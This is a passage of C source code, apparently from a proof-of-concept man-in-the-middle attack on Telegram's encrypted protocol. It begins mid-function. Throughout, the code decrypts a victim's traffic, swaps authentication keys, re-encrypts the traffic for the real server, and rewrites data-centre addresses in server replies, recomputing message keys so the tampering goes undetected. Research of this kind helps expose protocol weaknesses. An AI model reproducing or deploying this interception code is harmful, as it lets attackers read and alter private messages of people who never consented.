     int l = pad_aes_decrypt ((char *)&enc.server_salt, len - UNENCSZ, (char *) &enc.server_salt, len - UNENCSZ);
     assert (l == len - UNENCSZ);

     if(pocverbosity) {
       fprintf(stdout, "[VICTIM -> MITM -> TELEGRAM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
       _print_enc_message(stdout, &enc);
     }

     /* Change the auth key */
     enc.auth_key_id = DC_working->auth_key_id;
     
     /* /\* Re-encrypt and send it *\/ */
     /* encrypt_send_message (DC_working->sessions[0]->c, (int *) &enc, len, 1); */

     /* Re-encrypt it with the key negotiated with Telegram */
     init_aes_auth (DC_working->auth_key, enc.msg_key, AES_ENCRYPT);
     /* pad_aes_encrypt ((char *) &enc.server_salt, len - UNENCSZ, (char *) &enc.server_salt, len - UNENCSZ); */
     /* int l =  */aes_encrypt_message (DC_working, &enc);

     /* Send it through the socket established with Telegram */
     data = realloc(data, len+1);
     data[0] = size[0];
     memcpy(data+1, &enc, len);
     mitm_send(DC_working->sessions[0]->c->fd, data, len+1);
     free(data); data = NULL;   

   }

   return NULL;

 }

void* mitm_tg2victim(char *data, int len, struct dc *DC_working) {

  char *_data;
  struct encrypted_message *enc;
  const int UNENCSZ = offsetof (struct encrypted_message, server_salt);
  const int MINSZ = offsetof (struct encrypted_message, message);
  int reduct;

  /* if(c_state == st_authorized && port != 65521) return NULL */;

  /* Error codes... */
  if(len < 24) {
    char *_data = malloc(len+1);
    memcpy(_data+1, (char *) data, len);
    _data[0] = 0x01;
    mitm_send(mitm_victim_fd, _data, len+1);
    return NULL;
  }

  enc = (struct encrypted_message *) data;

  /* Decrypt the data using the key negotiated with Telegram */
  init_aes_auth (DC_working->auth_key + 8, enc->msg_key, AES_DECRYPT); 
  /* int l =  */pad_aes_decrypt ((char *)&enc->server_salt, len - UNENCSZ, (char *) &enc->server_salt, len - UNENCSZ);

  if(pocverbosity) {
    fprintf(stdout, "\n[TELEGRAM -> MITM] (%.2lf):\n", get_utime(CLOCK_REALTIME));
    _print_enc_message(stdout, enc);
  }

  /* If the message contains IPs of other DCs, modify it */
  reduct = 0;
  if(_mitm_switch_dcs((unsigned char *) &enc->server_salt, len - UNENCSZ, &reduct) == 1) {    
    if(reduct) {
      enc->msg_len -= reduct;
    }    
    /* Compute the new msg key and update it */
    static unsigned char sha1_buffer[20];
    sha1 ((void *)&enc->server_salt, enc->msg_len + (MINSZ - UNENCSZ), sha1_buffer);
    memcpy(enc->msg_key, sha1_buffer+4, 16);
  }

  fprintf(stdout, "\n[MITM -> VICTIM] (%.2lf):\n", get_utime(CLOCK_REALTIME));

  /* Change the auth key */
  enc->auth_key_id = mitm_auth_key_id;
  if(pocverbosity) {
    _print_enc_message(stdout, enc);
  }

  /* Re-encrypt it with the key negotiated with the VICTIM */
  init_aes_auth (mitm_auth_key, enc->msg_key, AES_ENCRYPT);
  pad_aes_encrypt ((char *) &enc->server_salt, len, (char *) &enc->server_salt, MAX_MESSAGE_INTS * 4 + (MINSZ - UNENCSZ));

  /* /\* Change the auth key *\/ */
  /* enc->auth_key_id = mitm_auth_key_id; */

  /* Send it through the socket established with the victim */
  _data = malloc(len+1);
  memcpy(_data+1, data, len);
  _data[0] = (unsigned char) len/4;
  mitm_send(mitm_victim_fd, _data, len+1);
  free(_data); _data = NULL;

  return NULL;

}
